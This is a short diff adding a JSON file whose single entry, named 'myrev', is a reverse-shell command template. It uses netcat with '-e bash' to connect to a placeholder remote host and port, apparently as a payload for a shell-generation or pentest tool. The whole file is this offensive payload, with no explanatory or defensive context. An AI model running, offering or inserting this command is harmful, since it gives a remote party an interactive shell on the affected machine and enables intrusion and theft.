@@ -1,0 +1,3 @@
+{
+  "myrev": "sh rlwrap nc {rhost} {lport} -e bash"
+}
